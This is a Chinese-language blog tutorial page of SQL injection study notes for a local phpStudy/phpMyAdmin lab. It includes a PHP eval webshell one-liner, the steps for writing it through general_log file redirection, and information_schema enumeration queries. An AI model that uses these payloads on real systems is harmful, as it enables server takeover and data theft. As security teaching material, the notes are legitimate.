@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="phpstudy_pro的phpMyAdmin4.8.5phpstudy_pro里下载phpMyAdmin4.8.5 1http:&#x2F;&#x2F;192.168.10.129&#x2F;phpMyAdmin4.8.5&#x2F;    SQL注入 写入webshell的前提条件： 1、需要root权限 2、知道网站根目录的绝对路径 3、数据库my.ini配置文件需要secure_file_priv配置为空 1show globa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="phpstudy_pro的phpMyAdmin4.8.5phpstudy_pro里下载phpMyAdmin4.8.5 1http:&#x2F;&#x2F;192.168.10.129&#x2F;phpMyAdmin4.8.5&#x2F;    SQL注入 写入webshell的前提条件： 1、需要root权限 2、知道网站根目录的绝对路径 3、数据库my.ini配置文件需要secure_file_priv配置为空 1show globa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="e:\z_\noteNO\SQL%E6%B3%A8%E5%85%A5\mysql_0.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/Yakit_2023_11_13_19_48_58_729.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/Yakit_2023_11_13_19_49_50_956.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_40_53_198.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_00_29_82.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_18_27_370.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_07_966.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_14_130.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_30_732.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_56_146.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_22_695.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_28_11.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_58_281.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_21_02_448.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_21_32_77.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_23_28_992.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_24_43_691.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_25_10_460.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_04_775.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_17_574.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_20_541.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_23_739.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_45_236.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_34_37_432.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_35_02_58.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_35_47_491.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_36_49_76.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_04_475.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_12_127.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_29_125.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_40_04_614.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_46_54_103.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_47_55_787.png">
+<meta property="og:image" content="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_48_09_514.png">
+<meta property="article:published_time" content="2023-11-22T11:23:25.000Z">
+<meta property="article:modified_time" content="2023-12-10T01:28:27.465Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="SQLMap">
+<meta property="article:tag" content="AntSword">
+<meta property="article:tag" content="BurSpuite">
+<meta property="article:tag" content="Yakit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:\z_\noteNO\SQL%E6%B3%A8%E5%85%A5\mysql_0.png">
+
+
+<link rel="canonical" href="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/","path":"2023/11/22/SQL注入/","title":"SQL注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#phpstudy-pro%E7%9A%84phpMyAdmin4-8-5"><span class="nav-number">1.</span> <span class="nav-text">phpstudy_pro的phpMyAdmin4.8.5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">sql注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">1、什么是SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.1.2.</span> <span class="nav-text">2、SQL注入产生的条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">Mysql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81Sql%E6%B3%A8%E5%85%A5%E4%B8%ADMysql%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.1.</span> <span class="nav-text">1、Sql注入中Mysql常用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%85%B3%E4%BA%8EMysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.2.2.</span> <span class="nav-text">2、关于Mysql数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%85%B3%E4%BA%8EMysql%E6%B3%A8%E9%87%8A"><span class="nav-number">2.2.3.</span> <span class="nav-text">3、关于Mysql注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81Mysql%E8%B7%A8%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.</span> <span class="nav-text">4、Mysql跨库注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81Mysql%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">2.2.5.</span> <span class="nav-text">5、Mysql文件读写————————-</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP%E8%AF%A6%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">SQLMAP详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">3.1.</span> <span class="nav-text">SQLmap是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap%E5%AE%89%E8%A3%85"><span class="nav-number">3.2.</span> <span class="nav-text">SQLmap安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E7%9B%AE%E5%BD%95%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.3.</span> <span class="nav-text">SQLMAP目录介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E7%89%B9%E6%80%A7"><span class="nav-number">3.4.</span> <span class="nav-text">SQLMAP特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">3.5.</span> <span class="nav-text">SQLMAP基本命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91-AntSword-%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">中国蚁剑(AntSword)安装、使用教程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Yakit"><span class="nav-number">5.</span> <span class="nav-text">Yakit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BurpSuite"><span class="nav-number">6.</span> <span class="nav-text">BurpSuite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BurpSuite-%E8%A7%A3%E5%8E%8B%E5%AE%89%E8%A3%85"><span class="nav-number">6.1.</span> <span class="nav-text">BurpSuite 解压安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E8%AF%81%E4%B9%A6"><span class="nav-number">6.2.</span> <span class="nav-text">管理证书</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="nav-number">6.3.</span> <span class="nav-text">代理设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BurpSuite%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">6.4.</span> <span class="nav-text">BurpSuite的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%8B%A6%E6%88%AA%E8%AF%B7%E6%B1%82"><span class="nav-number">6.4.1.</span> <span class="nav-text">1、拦截请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81sql%E6%B3%A8%E5%85%A5"><span class="nav-number">6.4.2.</span> <span class="nav-text">2、sql注入</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/22/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入 | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-11-22 19:23:25" itemprop="dateCreated datePublished" datetime="2023-11-22T19:23:25+08:00">2023-11-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-12-10 09:28:27" itemprop="dateModified" datetime="2023-12-10T09:28:27+08:00">2023-12-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="phpstudy-pro的phpMyAdmin4-8-5"><a href="#phpstudy-pro的phpMyAdmin4-8-5" class="headerlink" title="phpstudy_pro的phpMyAdmin4.8.5"></a>phpstudy_pro的phpMyAdmin4.8.5</h2><p>phpstudy_pro里下载phpMyAdmin4.8.5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.129/phpMyAdmin4.8.5/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>SQL注入</p>
+<p>写入webshell的前提条件：</p>
+<p>1、需要root权限</p>
+<p>2、知道网站根目录的绝对路径</p>
+<p>3、数据库my.ini配置文件需要secure_file_priv配置为空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sql注入写入webshell的方法：</p>
+<p>1、通过outfile()函数写入一句木马。</p>
+<p>2、通过phpmyadmin写入webshell</p>
+<p>如果网站安装了phpmyadmin并成功登录到了，利用通过phpmyadmin写入木马。</p>
+<blockquote>
+<p>phpMyAdmin是一个以PHP为基础，以Web-Base方式架构在网络主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p>
+</blockquote>
+<p>3、通过phpmyadmin更改日志写入webshell</p>
+<p>查看mysql是否开启全局日志，更改日志的路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;								查看是否开启全局日志</span><br><span class="line">set global general_log=OFF;										设置关闭全局日志记录</span><br><span class="line">set global general_log=ON;										设置开启全局日志记录</span><br><span class="line">set global general_log_file=&quot;C:/z2/phpstudy_pro/WWW/1.php&quot;;		更改日志的路径</span><br><span class="line">// C:\z2\phpstudy_pro\Extensions\MySQL5.7.26\data\DES...</span><br><span class="line">// /var/lib/mysql/180c628a3480.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;? phpinfo(); ?&gt;&quot;;</span><br><span class="line">select &quot;&lt;?php info(); ?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote>
+<p>参考：[Sql注入详解(原理篇)_sql注入原理_Naive&#96;的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45954730/article/details/131525362)%E3%80%81[sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B4%E7%A7%8D%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81">https://blog.csdn.net/weixin_45954730/article/details/131525362)、[sql注入流程4种方式获取数据库服务器用户名密码</a> - 程序员大本营 (pianshen.com)](<a target="_blank" rel="noopener" href="https://www.pianshen.com/article/39272198194/">https://www.pianshen.com/article/39272198194/</a>)</p>
+</blockquote>
+<h3 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h3><h4 id="1、什么是SQL注入"><a href="#1、什么是SQL注入" class="headerlink" title="1、什么是SQL注入"></a>1、什么是SQL注入</h4><p>SQL注入（SQL Inject）指web应用程序对用户输入数据的合法性没有判断或过滤不严格，攻击者可以在web应用程序中事先定义好的查询语句的给尾添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<p>SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤。SQL注入是针对数据库、后台、系统层面的攻击！</p>
+<p>sql注入属于服务端攻击，原理是参数带入给变量时未经过滤直接带入数据库查询</p>
+<p>sql注入与操作系统、数据库类型、脚本语言类型无关，与程序员写的源代码有关</p>
+<h4 id="2、SQL注入产生的条件"><a href="#2、SQL注入产生的条件" class="headerlink" title="2、SQL注入产生的条件"></a>2、SQL注入产生的条件</h4><ul>
+<li>传递给后端的<code>参数是可以控制的</code></li>
+<li><code>参数内容会被带入到数据库查询</code></li>
+<li>变量未存在过滤或者过滤不严谨</li>
+</ul>
+<h3 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MySQL注入</span><br><span class="line">    - 信息搜集</span><br><span class="line">        - 数据库名</span><br><span class="line">        - 数据库用户</span><br><span class="line">        - 操作系统</span><br><span class="line">        - 数据库版本</span><br><span class="line">        -其它（如：网站路径...）</span><br><span class="line">    - 数据注入（高低版本以5.0为界）</span><br><span class="line">        - 低版本：暴力查询和联合查询</span><br><span class="line">        - 高版本：information_schema有据查询</span><br><span class="line">    - 高权限注入</span><br><span class="line">        - 常规查询</span><br><span class="line">        - 跨库查询：利用注入进行库数据库查询</span><br><span class="line">        - 文件读写</span><br><span class="line">            - 存在魔术引导：编码或宽字节绕过</span><br><span class="line">            - 不存在魔术引导</span><br><span class="line">    - 相关防注入</span><br><span class="line">        - 自带防御：魔术引号</span><br><span class="line">        - 内置函数</span><br><span class="line">        - 自定义关键字</span><br><span class="line">        - WAF防护软件</span><br></pre></td></tr></table></figure>
+
+<h4 id="1、Sql注入中Mysql常用函数"><a href="#1、Sql注入中Mysql常用函数" class="headerlink" title="1、Sql注入中Mysql常用函数"></a>1、Sql注入中Mysql常用函数</h4><blockquote>
+<p>收集操作系统、数据库版本、数据库名字、数据库用户等信息，为后续注入做准备</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version()                 # 查看数据库版本</span><br><span class="line">database()                # 查看当前数据库名</span><br><span class="line">user()                    # 查看当前数据库用户</span><br><span class="line">system_user()             # 查看系统用户名</span><br><span class="line">group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串</span><br><span class="line">@@datadir                 # 查看数据库路径</span><br><span class="line">@@version_compile_os      # 查看操作系统</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、关于Mysql数据库"><a href="#2、关于Mysql数据库" class="headerlink" title="2、关于Mysql数据库"></a>2、关于Mysql数据库</h4><p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个 <code>information_schema</code> 的数据库，该数据库中包含了当前系统中所有的数据库、表、列、索引、视图等相关的元数据信息，是MySql自身信息元数据的存储库，我们需要记住三个表名，分别是 <code>schemata</code>，<code>tables</code>，<code>columns</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schemata         # 存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。</span><br><span class="line">tables           # 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库库名和表名的字段分别是 table_schema 和 table_name。</span><br><span class="line">columns          # 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\z_\noteNO\SQL注入\mysql_0.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有的数据库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、关于Mysql注释"><a href="#3、关于Mysql注释" class="headerlink" title="3、关于Mysql注释"></a>3、关于Mysql注释</h4><p>在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是<code>#</code>和<code>-- </code>(–后面有空格)</p>
+<p>但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；<strong>而使用– （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为+会被解释成空格。</strong></p>
+<blockquote>
+<ul>
+<li>也可以使用<code>--%20</code>，把空格转换为<code>url encode</code>编码格式，也不会报错。同理把 <code>#</code> 变成 <code>%23</code> ,也不报错。</li>
+<li>如果是<code>post</code>请求，则可以直接使用<code>#</code>来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。</li>
+</ul>
+</blockquote>
